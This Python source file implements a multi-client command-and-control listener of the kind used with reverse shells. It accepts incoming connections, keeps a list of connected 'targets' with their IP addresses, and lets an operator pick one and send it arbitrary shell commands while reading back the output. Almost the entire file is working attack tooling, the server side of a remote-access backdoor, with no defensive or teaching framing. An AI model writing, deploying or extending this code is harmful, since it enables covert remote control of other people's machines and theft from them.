import socket
import threading
import time
from configparser import ConfigParser, ParsingError
from queue import Queue
from src import source


config = ConfigParser()
queue = Queue()

THREADS = 2
JOBS = [1, 2]
CONNECTIONS = []
IP_ADDRESSES = []


def socket_settings():
    try:
        config.read("./src/settings.ini")
        ss_settings = config['Socket_Server']
        host = ss_settings['host']
        port = ss_settings['port']
        return host, port
    except (KeyError, ValueError, ParsingError) as e:
        print(f"[!] Error reading settings.ini:\n[!] {e}\n\n")
        source.shutdown()    

def socket_server_thread():
    create_threads()
    create_jobs()

def create_threads():
    try:
        for _ in range(THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()
    except Exception:
        print('[!] Error')

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            time.sleep(1)
            client_connection()
            return

def create_jobs():
    for x in JOBS:
        queue.put(x)
    queue.join()

def socket_create():
    try:
        global ss
        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e:
        print(f"[!] Socket creation error: {e}")

def socket_bind():
    try:
        host, port = socket_settings()
        global ss
        ss.bind((host, int(port)))
        ss.listen(5)
        print(f"[*] Listening on {host}:{port}")
    except socket.error as e:
        print(f"[!] Socket binding error: {e}")
        time.sleep(5)
        socket_bind()

def accept_connections():
    for c in CONNECTIONS:
        c.close()
    del CONNECTIONS[:]
    del IP_ADDRESSES[:]

    while True:
        try:
            conn, address = ss.accept()
            #conn.setblocking(True)
            CONNECTIONS.append(conn)
            IP_ADDRESSES.append(address)
            print(f"\n[*] Connection established: {address[0]}\n[+] > ", end="")
        except:
            print("[!] Error accepting connections")

def client_connection():
    #queue.task_done()
    while True:
        cmd = input("[>] ")

        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                get_target_commands(conn)
        else:
            print(f"[!] command not recognized: {cmd}")

def list_connections():
    results = ""
    for i, conn in enumerate(CONNECTIONS):
        try:
            conn.send(str.encode(' '))
            conn.recv(2048)
        except:
            del CONNECTIONS[i]
            del IP_ADDRESSES[i]
            continue
        results += f"+ {i}  {IP_ADDRESSES[i][0]}:{IP_ADDRESSES[i][1]} \n "
    print(f'[*] ----- clients ---- \n {results}\n')
    return results

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = CONNECTIONS[target]
        print(f"[*] connected to {IP_ADDRESSES[target][0]}")
        print(f"{IP_ADDRESSES[target][0]} $ ", end="")
        return conn
    except:
        print(f"[!] {target} is not a valid selection")
        return None

def get_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                return
            response = send_target_commands(cmd, conn)
            print(response, end="")
        except:
            print('[!] Unknown error (get_target_commands)')

def send_target_commands(cmd, conn):
    try:
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            return client_response
    except Exception:
        print("[!] Connection to client was lost")
        return
